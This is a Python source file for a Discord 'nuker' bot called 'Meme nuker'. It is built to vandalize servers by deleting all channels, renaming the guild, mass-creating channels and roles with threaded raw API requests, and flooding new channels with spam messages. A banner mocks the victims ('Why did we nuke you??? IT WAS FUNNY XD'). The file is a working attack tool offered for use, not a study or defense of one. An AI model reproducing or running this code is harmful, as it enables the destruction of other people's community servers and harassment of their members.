import discord
import random
import time
import os
import requests
import threading
from pystyle import *
from colorama import *
from discord.ext import commands


# Define main classes

def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def title(args):
    if args:
        os.system(f"title Meme nuker [~] Made with love by HannahHaven [~] {args}")
    else:
        os.system(f"title Meme nuker [~] Made with love by HannahHaven")


# Defining main variables

session = requests.Session()

ascii_art = """    __  ___                                   __            
   /  |/  /__  ____ ___  ___     ____  __  __/ /_____  _____
  / /|_/ / _ \/ __ `__ \/ _ \   / __ \/ / / / //_/ _ \/ ___/
 / /  / /  __/ / / / / /  __/  / / / / /_/ / ,< /  __/ /    
/_/  /_/\___/_/ /_/ /_/\___/  /_/ /_/\__,_/_/|_|\___/_/

Why did we nuke you??? IT WAS FUNNY XD                                                                                                                                                              
"""
global thing
thing = "False"


# Set the bots intents and token as well as remvoing the built in help command

astolfo = commands.Bot(command_prefix=",",intent=discord.Intents.all())
astolfo.remove_command("help")

clear()
token = input(f"{Fore.YELLOW}[!]{Fore.RESET} Bot token: ")
clear()



# Checking when the bot is ready

@astolfo.event
async def on_ready():
    title(None)
    print(Colorate.Vertical(Colors.red_to_blue, ascii_art))
    print(f"\n{Fore.GREEN}[+]{Fore.RESET} Logged in as {astolfo.user.name}")
    print(f"{Fore.YELLOW}[!]{Fore.RESET} Awaiting orders sir...\n")


# Commands

@astolfo.command()
async def fakeip(ctx, count: int):
    await ctx.message.delete()
    for i in range(count):
        time.sleep(0.4)
        await ctx.send(f"Generated IP: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}")



@astolfo.command()
async def msgspam(ctx, message: str, count: int):
    print(f"\n{Fore.CYAN}[INFO]{Fore.RESET} Started spamming\n")
    for i in range(count):
        time.sleep(0.2)
        headers = {
            "Authorization" : f"Bot {token}",
        }
        data = {
            "content" : message
        }
        r = requests.post(f"https://discordapp.com/api/channels/{ctx.channel.id}/messages", headers=headers, data=data)
        if r.status_code == 200:
            print(f"{Fore.GREEN}[+]{Fore.RESET} Message sent: {r.status_code}")
        else:
            print(f"{Fore.RED}[-]{Fore.RESET} Failed to send message: {r.status_code}")
    print(f"\n{Fore.CYAN}[INFO]{Fore.RESET} Finished spamming")



@astolfo.command()
async def speedchannelspam(ctx):
    await ctx.message.delete()
    t = time.localtime()
    #currenttime = time.strftime("%H:%M", t)
    guild = ctx.guild.id
    chan = input(f"\n{Fore.YELLOW}[!]{Fore.RESET} Channel name: ")
    amount = int(input(f"{Fore.YELLOW}[!]{Fore.RESET} Number of channels: "))
    print(f"\n{Fore.CYAN}[INFO]{Fore.RESET} Started spamming\n")
    headers = {
        "Authorization" : f"Bot {token}",
    }
    def cc(i):
        json = {
            "name": i
        }
        session.post(
            f"https://discord.com/api/v9/guilds/{guild}/channels",
            headers=headers,
            json=json
        )
    for i in range(amount):
            threading.Thread(
                target=cc,
                args=(chan, )
            ).start()
            print(f"{Fore.GREEN}[+]{Fore.RESET} Created channel [{i + 1}/{amount}]", end='\r')
    print(f"\n{Fore.CYAN}[INFO]{Fore.RESET} Finished spamming")




@astolfo.command()
async def deletechannels(ctx):
    await ctx.message.delete()
    print(f"\n{Fore.CYAN}[INFO]{Fore.RESET} Started removing channels\n")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"{Fore.GREEN}[+]{Fore.RESET} Deleted channel: {channel}")
        except Exception as e:
            print(f"{Fore.RED}[-]{Fore.RESET} Failed to delete channel: {channel}")
    guild = ctx.message.guild
    await guild.create_text_channel('Astolfo | general')
    print("")
    print(f"{Fore.CYAN}[INFO]{Fore.RESET} Finished removing channels\n")



@astolfo.command()
async def setup_bot(ctx):
    await ctx.message.delete()
    global message
    global amount_of_nuker_messages_per_channel
    chan = input(f"{Fore.YELLOW}[!]{Fore.RESET} Channel name: ")
    make_roles = input(f"{Fore.YELLOW}[!]{Fore.RESET} Make roles? [y/n]: ")
    if make_roles.lower() == "y":
        rolename = input(f"{Fore.YELLOW}[!]{Fore.RESET} Role name: ")
    guildname = input(f"{Fore.YELLOW}[!]{Fore.RESET} Guild name: ")
    message = input(f"{Fore.YELLOW}[!]{Fore.RESET} Message: ")
    amount_of_channels = int(input(f"{Fore.YELLOW}[!]{Fore.RESET} Amount of channels/roles: "))
    amount_of_nuker_messages_per_channel = int(input(f"{Fore.YELLOW}[!]{Fore.RESET} Amount of messages per channel: "))
    delete_channels = input(f"{Fore.YELLOW}[!]{Fore.RESET} Delete channels? [y/n]: ")
    global thing
    thing = "True"
    await ctx.guild.edit(name=guildname)


    if delete_channels.lower() == "y":
        try:
            for channel in ctx.guild.channels:
                await channel.delete()
        except Exception as e:
            print(f"{Fore.RED}[-]{Fore.reset} An error occured when deleting channels | e")
            pass

    for i in range(amount_of_channels):
        await ctx.guild.create_text_channel(chan)
        print(f"{Fore.GREEN}[+]{Fore.RESET} Created channel | {chan} | {i+1}")
        if make_roles == "y":
            await ctx.guild.create_role(name=rolename)
            print(f"{Fore.GREEN}[+]{Fore.RESET} Created role | {rolename} | [{i+1}]")
    


@astolfo.event
async def on_guild_channel_create(channel):
    global thing
    if thing == "True":
        for i in range(amount_of_nuker_messages_per_channel):
            try:
                t = time.localtime()
                #currenttime = time.strftime("%H:%M", t)
                count = i+1
                print(f"{Fore.GREEN}[+]{Fore.RESET} Message sent in {channel.id} | [{count}]")
                await channel.send(message)
            except Exception as e:
                print(f"{Fore.RED}[-]{Fore.RESET} An error occured | {e}")
        thing = "False"
    else:
        pass

@astolfo.command()
async def rolespam(ctx):
    rolename = input(f"{Fore.YELLOW}[!]{Fore.RESET} Role name: ")
    amount = int(input(f"{Fore.YELLOW}[!]{Fore.RESET} Amount of roles: "))
    print(f"\n{Fore.CYAN}[INFO]{Fore.RESET} Started spamming roles\n")
    for i in range(amount):
        t = time.localtime()
        #currenttime = time.strftime("%H:%M", t)
        await ctx.guild.create_role(name=rolename)
        print(f"{Fore.GREEN}[+]{Fore.RESET} Created role | {rolename} | [{i+1}]")
    print(f"\n{Fore.CYAN}[INFO]{Fore.RESET} Stopped spamming roles\n")



# Run the bot

astolfo.run(token)